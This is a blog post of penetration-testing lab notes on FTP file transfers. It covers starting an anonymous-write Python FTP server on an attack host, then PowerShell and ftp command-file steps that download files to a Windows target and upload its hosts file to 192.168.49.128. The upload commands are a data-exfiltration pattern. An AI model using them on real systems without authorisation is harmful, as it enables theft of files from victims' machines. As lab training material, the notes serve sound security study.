---
description: >-
  FTP Transfer files
title: FTP Transfer files              # Add title here
date: 2024-01-15 08:00:00 -0600                           # Change the date to match completion date
categories: [03 File Transfer, FTP Transfer]                     # Change Templates to Writeup
tags: [file transfer, ftp]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: false                                    # Change this to true
#image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
---

### FTP Downloads
A way to transfer files is using FTP (File Transfer Protocol), which use port TCP/21 and TCP/20. We can use the FTP client or PowerShell Net.WebClient to download files from an FTP server.

Installation:
```bash
Shuciran@htb[/htb]$ sudo pip3 install pyftpdlib
```

> Then we can specify port number 21 because, by default, pyftpdlib uses port 2121. Anonymous authentication is enabled by default if we don't set a user and password.
{: .prompt-warning }

### Setting up a Python3 FTP Server:
```bash
Shuciran@htb[/htb]$ sudo python3 -m pyftpdlib --port 21
```

### Transfering Files from an FTP Server Using PowerShell
```bash
PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

### Create a Command File for the FTP Client and Download the Target File
```powershell
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo GET file.txt >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\htb>more file.txt
This is a test file
```


### FTP Uploads
Uploading files using FTP is very similar to downloading files. We can use PowerShell or the FTP client to complete the operation. Before we start our FTP Server using the Python module pyftpdlib, we need to specify the option --write to allow clients to upload files to our attack host.

### Uploading Files using SMB
```bash
Shuciran@htb[/htb]$ sudo python3 -m pyftpdlib --port 21 --write
/usr/local/lib/python3.9/dist-packages/pyftpdlib/authorizers.py:243: RuntimeWarning: write permissions assigned to anonymous user.
  warnings.warn("write permissions assigned to anonymous user.",
[I 2022-05-18 10:33:31] concurrency model: async
[I 2022-05-18 10:33:31] masquerade (NAT) address: None
[I 2022-05-18 10:33:31] passive ports: None
[I 2022-05-18 10:33:31] >>> starting FTP server on 0.0.0.0:21, pid=5155 <<<
```

### PowerShell Upload File
```powershell
PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

### Create a Command File for the FTP Client to Upload a File
```powershell
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128

Log in with USER and PASS first.

ftp> USER anonymous
ftp> PUT c:\windows\system32\drivers\etc\hosts
ftp> bye
```